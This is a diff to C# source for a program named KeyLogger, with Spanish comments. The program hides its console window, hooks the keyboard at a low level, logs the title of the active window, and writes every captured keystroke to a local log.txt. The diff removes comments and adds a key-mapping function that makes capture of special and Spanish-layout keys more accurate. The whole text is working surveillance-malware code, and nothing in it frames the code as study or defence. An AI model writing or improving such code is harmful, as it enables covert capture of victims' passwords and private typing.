@@ -20,11 +20,9 @@ class KeyLogger
     [STAThread]
     static void Main()
     {
-        // Ocultar consola
         IntPtr handle = GetConsoleWindow();
         ShowWindow(handle, SW_HIDE);
 
-        // Ruta del log
         string exePath = Assembly.GetExecutingAssembly().Location;
         string exeDir = Path.GetDirectoryName(exePath);
         string logPath = Path.Combine(exeDir, "log.txt");
@@ -58,7 +56,6 @@ class KeyLogger
         {
             int vkCode = Marshal.ReadInt32(lParam);
 
-            // Obtener ventana activa
             IntPtr hWnd = GetForegroundWindow();
             StringBuilder winBuffer = new StringBuilder(256);
             GetWindowText(hWnd, winBuffer, 256);
@@ -72,10 +69,7 @@ class KeyLogger
                 logWriter.WriteLine("[" + time + "] Ventana: " + currentWindowTitle);
             }
 
-            // Obtener layout
             IntPtr layout = GetKeyboardLayout(0);
-
-            // Estado de teclas
             byte[] keyState = new byte[256];
             GetKeyboardState(keyState);
 
@@ -84,11 +78,18 @@ class KeyLogger
             if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
                 keyState[VK_CAPITAL] = 0x01;
 
-            // Traducir a carácter real
             StringBuilder buffer = new StringBuilder(5);
             int result = ToUnicodeEx((uint)vkCode, 0, keyState, buffer, buffer.Capacity, 0, layout);
 
-            string key = (result > 0) ? buffer.ToString() : "[" + ((Keys)vkCode).ToString() + "]";
+            string key;
+            if (result > 0 && !string.IsNullOrWhiteSpace(buffer.ToString()))
+            {
+                key = buffer.ToString();
+            }
+            else
+            {
+                key = MapKnownKey(vkCode);
+            }
 
             logWriter.Write(key);
         }
@@ -96,7 +97,43 @@ class KeyLogger
         return CallNextHookEx(_hookID, nCode, wParam, lParam);
     }
 
-    // Windows API
+    private static string MapKnownKey(int vkCode)
+    {
+        switch (vkCode)
+        {
+            case 219: return "[";       // Oem4
+            case 221: return "]";       // Oem6
+            case 186: return "ñ";       // Oem1 (ES layout)
+            case 192: return "º";       // Oem3
+            case 222: return "'";       // Oem7
+            case 220: return "\\";      // Oem5
+            case 191: return "?";
+            case 188: return ",";
+            case 190: return ".";
+            case 189: return "-";
+            case 187: return "=";
+            case 13: return "[ENTER]\n";
+            case 8: return "[BACKSPACE]";
+            case 9: return "[TAB]";
+            case 27: return "[ESC]";
+            case 160:
+            case 161: return "[SHIFT]";
+            case 162:
+            case 163: return "[CTRL]";
+            case 164: return "[ALT]";
+            case 44: return "[PrintScreen]";
+            default:
+                try
+                {
+                    return "[" + ((Keys)vkCode).ToString() + "]";
+                }
+                catch
+                {
+                    return "[UNK-" + vkCode + "]";
+                }
+        }
+    }
+
     [DllImport("user32.dll")]
     private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn,
         IntPtr hMod, uint dwThreadId);
